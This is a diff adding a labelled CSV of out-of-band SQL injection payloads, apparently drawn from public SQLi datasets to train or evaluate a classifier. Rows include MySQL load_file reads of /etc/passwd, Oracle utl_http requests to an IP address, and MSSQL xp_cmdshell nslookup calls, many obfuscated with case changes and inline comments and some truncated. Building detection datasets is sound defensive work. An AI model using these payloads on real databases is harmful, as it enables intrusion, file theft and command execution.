@@ -1,0 +1,18 @@
+payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
+'||utl_http.request ( 'httP://192.168.1.1/' ) ||',out_of_band,oracle,,0.46,rule,sqliv5_csv,unknown
+"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",out_of_band,mysql,case_variation,0.4,rule,sqliv5_csv,unknown
+"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;",out_of_band,mysql,,0.4,rule,sqliv5_csv,unknown
+"' and 1 = ( if ( ( load_file ( char ( 110,46,101,120,116 ) ) <>char ( 39,39 ) ) ,1,0 ) ) ;",out_of_band,mysql,,0.4,rule,sqliv5_csv,unknown
+"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",out_of_band,mysql,,0.4,rule,sqliv5_csv,unknown
+"and 1 = ( if ( ( load_file ( char ( 110,46,101,120,11 ...",out_of_band,mysql,,0.4,rule,sqliv5_csv,unknown
+"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",out_of_band,mysql,case_variation,0.4,rule,sqliv5_csv,unknown
+||utl_http.request ( 'httP://192.168.1.1/' ) ||',out_of_band,oracle,,0.46,rule,sqliv3_csv,unknown
+"and 1 = ( if ( ( load_file ( char ( 110,46,101,120,116 ) ) <>char ( 39,39 ) ) ,1,0 ) ) ;",out_of_band,mysql,,0.4,rule,sqliv3_csv,unknown
+"1; _(_.lOad_file ( chAr (=)0X2f,(SElEct 101),(seLeCT 0x9c),(sELeCt 93),0x11,0o0xA0,(seLeCT (SElEcT 0o0o215)),(seLEcT 115),0x0x73,0X4X71,0O0o220 ) ;/*./?J @>u,d6~'wp*/ ), . ) },(selEct 9),0O1,(SELECT (SeLecT 1));",out_of_band,mysql,case_variation|comment_whitespace|inline_comment,0.4,rule,sqliv5_json,unknown
+T'eXEC{MASter..XP_CmDShELl?'nSLOOkuP/*ag}G0X0o4B0O6G{bn C:|Oi[{e2x!*GMJzKm*/wWw.googLE.COm'--,out_of_band,mssql,inline_comment,0.46,rule,sqliv5_json,string_single_quote
+t'eXeC/*4B0b1B1900100o9B2o0O0o14AFW?t 1*/MasTeR..XP_cmDsHEll^'nSLOOKUp%WWW.gOOgL?...A,out_of_band,mssql,comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
+"0X1; (/**/ LOad_fIle (~ cHAR$ ( /*9*v}LQ*/0o0B161111,0O0b0O43136621,(SELECT 116),(SELEcT}0B300111),0O0X2F,0x0x46,(sElect 0X5D),0b11010111,(seLEcT (sElEcT 105)),(sElEcT (SELECT 110)),(SElECt 0X64) ): ;) /) ,(selECt:(SelEct 0X5)),0x1,(seLEct*0);",out_of_band,mysql,case_variation|comment_whitespace|inline_comment,0.4,rule,sqliv5_json,unknown
+"uNiON sEleCt.(seLEcT (SELECT 1)),loaD_fILE ( '/etC/passWD' ) ,,0x1,1,(SELECT 1);",out_of_band,mysql,case_variation,0.4,rule,sqliv5_json,unknown
+"AnD (SeLecT 1) LiKE&; ( If; ( /*|~M%**/( load_File ( Char (% (sElEcT (SELECt (SELECT 110))),(sELect 4o56),0x65,(SeLEcT 799),(SElECt 21)'...",out_of_band,mysql,case_variation|inline_comment,0.4,rule,sqliv5_json,unknown
+t'Exec/*nI&QU]+ ??oC0b111ZQtz$ KRh` */mASTER..xP_CmDsHell`'NSLooKUP:wwW.GOogLE.COM'--,out_of_band,mssql,comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_single_quote
+"t'Exec,MaSTer..xP_CmDShell/*Jpg|x6x9x0x8B801o0X0O5X9o0b0x5dj:q~(SELeCT.2x0X3){H+s(0b7x0o0o2X@:8qE(:wR:0x0O7I\js\):R]**tmUjk[u>(O]~s\oI2OB#*/'NslOokuP&wWW.GOOGL[...A",out_of_band,mssql,case_variation|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
